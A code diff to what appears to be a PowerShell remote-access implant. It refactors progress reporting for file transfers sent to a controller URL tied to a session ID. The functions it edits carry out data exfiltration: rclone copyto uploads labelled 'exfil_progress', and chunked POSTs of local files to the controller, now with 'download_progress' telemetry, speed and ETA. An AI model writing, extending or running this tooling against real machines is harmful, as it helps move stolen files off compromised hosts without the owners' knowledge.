@@ -955,12 +955,21 @@ function Send-RmmExfilProgressResult {
         [hashtable]$Payload,
         [hashtable]$Headers = @{}
     )
+    Send-RmmTransferProgressResult -ResultType 'exfil_progress' -Payload $Payload -Headers $Headers
+}
+
+function Send-RmmTransferProgressResult {
+    param(
+        [Parameter(Mandatory = $true)][string]$ResultType,
+        [hashtable]$Payload,
+        [hashtable]$Headers = @{}
+    )
     $json = $Payload | ConvertTo-Json -Compress -Depth 8
-    $resultUrl = "$u/result?id=$sessionId&type=exfil_progress"
+    $resultUrl = "$u/result?id=$sessionId&type=$ResultType"
     try {
         Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue | Out-Null
     } catch {
-        Write-RmmLog "Exfil progress POST failed: $($_.Exception.Message)" -Level DEBUG
+        Write-RmmLog "$ResultType POST failed: $($_.Exception.Message)" -Level DEBUG
     }
 }
 
@@ -982,16 +991,18 @@ function Format-RmmDuration {
     return ('{0}h {1}m' -f ([math]::Floor($s / 3600)), ([math]::Floor(($s % 3600) / 60)))
 }
 
-function Send-RmmExfilProgressIfChanged {
+function Send-RmmTransferProgressIfChanged {
     param(
-        [hashtable]$Context,
+        [Parameter(Mandatory = $true)][string]$ResultType,
+        [hashtable]$Payload,
         [hashtable]$Headers,
         [long]$Bytes,
         [long]$TotalBytes,
         [double]$Speed,
         [double]$Eta,
         [ref]$LastSentPct,
-        [ref]$LastSentAt
+        [ref]$LastSentAt,
+        [string]$LogLabel = 'Transfer'
     )
     if ($TotalBytes -le 0) { return }
     $pct = [math]::Min(100.0, [math]::Max(0.0, ($Bytes * 100.0 / $TotalBytes)))
@@ -1004,18 +1015,51 @@ function Send-RmmExfilProgressIfChanged {
     $speedBps = [long][math]::Max(0, [math]::Round($Speed))
     $etaSec = if ($Eta -ge 0) { [int][math]::Round($Eta) } else { -1 }
 
-    Send-RmmExfilProgressResult -Payload @{
+    $out = @{} + $Payload
+    $out.bytes = $Bytes
+    $out.total_bytes = $TotalBytes
+    $out.percent = [math]::Round($pct, 1)
+    $out.speed_bps = $speedBps
+    $out.eta_seconds = $etaSec
+    Send-RmmTransferProgressResult -ResultType $ResultType -Payload $out -Headers $Headers
+
+    $msg = ('{0} {1:N1}% ({2} / {3}, {4}/s, ETA {5})' -f $LogLabel, $pct, (Format-RmmByteSize $Bytes), (Format-RmmByteSize $TotalBytes), (Format-RmmByteSize $speedBps), (Format-RmmDuration $Eta))
+    Write-Host "[*] $msg" -ForegroundColor Cyan
+}
+
+function Send-RmmExfilProgressIfChanged {
+    param(
+        [hashtable]$Context,
+        [hashtable]$Headers,
+        [long]$Bytes,
+        [long]$TotalBytes,
+        [double]$Speed,
+        [double]$Eta,
+        [ref]$LastSentPct,
+        [ref]$LastSentAt
+    )
+    Send-RmmTransferProgressIfChanged -ResultType 'exfil_progress' -Payload @{
         remote_path = [string]$Context.remote_path
         profile     = [string]$Context.profile
-        bytes       = $Bytes
-        total_bytes = $TotalBytes
-        percent     = [math]::Round($pct, 1)
-        speed_bps   = $speedBps
-        eta_seconds = $etaSec
-    } -Headers $Headers
+    } -Headers $Headers -Bytes $Bytes -TotalBytes $TotalBytes -Speed $Speed -Eta $Eta `
+        -LastSentPct $LastSentPct -LastSentAt $LastSentAt -LogLabel 'Exfil'
+}
 
-    $msg = ('Exfil {0:N1}% ({1} / {2}, {3}/s, ETA {4})' -f $pct, (Format-RmmByteSize $Bytes), (Format-RmmByteSize $TotalBytes), (Format-RmmByteSize $speedBps), (Format-RmmDuration $Eta))
-    Write-Host "[*] $msg" -ForegroundColor Cyan
+function Send-RmmDownloadProgressIfChanged {
+    param(
+        [string]$RemotePath,
+        [hashtable]$Headers,
+        [long]$Bytes,
+        [long]$TotalBytes,
+        [double]$Speed,
+        [double]$Eta,
+        [ref]$LastSentPct,
+        [ref]$LastSentAt
+    )
+    Send-RmmTransferProgressIfChanged -ResultType 'download_progress' -Payload @{
+        remote_path = [string]$RemotePath
+    } -Headers $Headers -Bytes $Bytes -TotalBytes $TotalBytes -Speed $Speed -Eta $Eta `
+        -LastSentPct $LastSentPct -LastSentAt $LastSentAt -LogLabel 'Download'
 }
 
 function Read-RmmRcloneJsonLogProgress {
@@ -1085,7 +1129,7 @@ function Invoke-RmmRcloneCopytoWithProgress {
         Write-RmmLog "rclone copyto (progress) $LocalPath -> $RemoteTarget" -Level DEBUG
         $totalBytes = [long]$Context.total_bytes
         if ($totalBytes -gt 0) {
-            Send-RmmExfilProgressResult -Payload @{
+            Send-RmmTransferProgressResult -ResultType 'exfil_progress' -Payload @{
                 remote_path = [string]$Context.remote_path
                 profile     = [string]$Context.profile
                 bytes       = 0
@@ -1252,10 +1296,24 @@ function Send-RmmFileDownload {
     $uploadId = [guid]::NewGuid().ToString('N')
     $chunkBytes = 6MB
     $resultUrl = "$u/result?id=$sessionId&type=file_upload"
+    $lastSentPct = -1.0
+    $lastSentAt = [DateTime]::MinValue
+    $startTime = [DateTime]::UtcNow
     $fs = [System.IO.File]::OpenRead($FilePath)
     try {
         $offset = [long]0
         $fileLen = $fs.Length
+        if ($fileLen -gt 0) {
+            Send-RmmTransferProgressResult -ResultType 'download_progress' -Payload @{
+                remote_path = [string]$RemotePath
+                bytes       = 0
+                total_bytes = [long]$fileLen
+                percent     = 0
+                speed_bps   = 0
+                eta_seconds = -1
+            } -Headers $Headers
+            Write-Host "[*] Download starting ($(Format-RmmByteSize $fileLen))…" -ForegroundColor Cyan
+        }
         if ($fileLen -eq 0) {
             $payload = @{
                 filename     = $fileName
@@ -1290,6 +1348,12 @@ function Send-RmmFileDownload {
             } | ConvertTo-Json -Compress
             Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
             $offset += $n
+            $elapsed = ([DateTime]::UtcNow - $startTime).TotalSeconds
+            $speed = if ($elapsed -gt 0) { $offset / $elapsed } else { 0.0 }
+            $remaining = [math]::Max(0, $fileLen - $offset)
+            $eta = if ($speed -gt 0) { $remaining / $speed } else { -1.0 }
+            Send-RmmDownloadProgressIfChanged -RemotePath $RemotePath -Headers $Headers -Bytes $offset `
+                -TotalBytes $fileLen -Speed $speed -Eta $eta -LastSentPct ([ref]$lastSentPct) -LastSentAt ([ref]$lastSentAt)
             if ($eof) { break }
         }
     } finally {
